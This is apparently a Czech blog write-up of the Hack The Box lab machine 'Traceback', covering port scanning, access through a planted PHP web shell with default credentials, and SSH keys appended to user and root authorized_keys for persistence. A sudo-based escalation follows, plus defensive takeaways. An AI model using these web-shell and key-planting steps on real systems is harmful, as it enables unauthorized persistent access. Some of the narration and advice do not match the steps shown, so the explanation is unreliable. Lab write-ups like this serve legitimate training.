---
layout: post
author: Tomáš Matějíček
title: "Traceback"
date: 2021-01-26
tags: linux rce ssh sudo php exploit
---
## Úvod a kontext

Traceback dobře ukazuje, že průlom často nezačíná jedním exploitem, ale kombinací signálů jako Apache a SSH.

Praktická část pak stojí na tom, jak se tyto zjištěné vazby promění v SSH s nalezenými přihlašovacími údaji a jak je po user části využitelná příliš široká `sudo` oprávnění.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```
PORT   STATE SERVICE VERSION
```

### Detailní analýza služeb

V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
```text
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```
```
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Získání přístupu

### Spuštění exploitu

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```text
HTML Source Code
```
```
=> Some of the best web shells that you might need
=> https://github.com/TheBinitGhimire/Web-Shells
```

### Přihlášení na cíl (2)

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```text
http://10.10.10.181/smevk.php
```
```
=> admin:admin
echo "ssh-rsa __CENSORED__== hack@t" >> /home/webadmin/.ssh/authorized_keys
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.

Následující úsek zachycuje přechod k uživatelskému přístupu a jeho ověření přes `user.txt`.

```text
ssh 2
ssh sysadmin@$IP

cat user.txt
069e269894656f6145043abf4dcef9da

vi /etc/update-motd.d/00-header

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8+QR3hnONfIO2Y/vhoVRgVDpeOUrpxa+EOnRNhAV9/dYNoi/hOn0TTNcf0I5ws2UXkJAZsjH6IRImyRSDA5ly8K8lYqTyWRUGU1EGZ2ovlR2fjzOTaeuKY8VylnwQzQBNrFPoDZ6uKjpORoRszHQf9WzrtZ8M+zcpGO0MLPiuEl78INxwii7y94CAn1gl+xlrIgKAF3inpuTlaLvEljLe1JgsYKJIcZNplYgA9pcDx7HWFceyAUwpdc438kTiANtmz6863mjfuoZ1LQ9mK8pmR010L9eQhO8FGq15Hpru0AJzIuTNoEJKYsdBG6ttfQ4DLmey6h0IE5IkcqrfH9gAweGIJ68zn3Xh1GP9CWO8iKxkMZPemr5GhBKB1mr0ebCjuWwxzmzmzeBcIm6PlSkkt5iULsgdgsvu/ptFIFGVukajnihbK/b3uWCDtaJcgaSILoSomouxjfXqmAwj/TaM0qHsT7K9NZsPfOB5ZAXa2spPR+AGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl+pmlehyW1Pl0RKi5eXxEQHZQddlDbpcwk6K9GVA04juJce5odDeWk0TUuxTgU2y1jnGnvQZSizjl6YcRXUNDXF2H/tFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw+ppfkBwBIs1Q== hack@t" >> /root/.ssh/authorized_keys
```

## Eskalace oprávnění

### Průzkum možností eskalace

Hledám chybné konfigurace a cesty k vyšším oprávněním.
```bash
sudo -l
```
```
=>     (sysadmin) NOPASSWD: __CENSORED__
```

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
cat root.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- Počáteční průzkum se z obecné enumerace změnil v použitelný směr teprve po propojení indicií jako Apache a SSH.
- User část stála na ověřeném kroku typu SSH s nalezenými přihlašovacími údaji, ne na odhadu bez technického potvrzení.
- Závěrečná eskalace pak stála na tom, co představuje příliš široká `sudo` oprávnění, takže rozhodující byla práce s lokálním kontextem po footholdu.

## Co si odnést do praxe

- Tento řetězec začal u Apache a SSH; právě tam má obrana největší návratnost. Převod dokumentů a server-side render je potřeba sandboxovat a oddělit od citlivého filesystemu; parser nebo převodník nesmí mít přístup k tajemstvím hostu.
- Foothold navázal na SSH s nalezenými přihlašovacími údaji, takže oddělení účtů a tajemství není jen teorie. Hesla a klíče je potřeba oddělovat mezi službami; jakmile stejné přihlašovací údaje fungují i na SSH, z lokálního úniku je plnohodnotný systémový přístup.
- Poslední krok stojí na příliš široká `sudo` oprávnění, a proto je nutné auditovat i lokální delegaci práv. Široká `sudo` oprávnění je potřeba pravidelně revidovat; wrapper, install helper nebo diagnostický příkaz často udělá z běžného účtu roota.
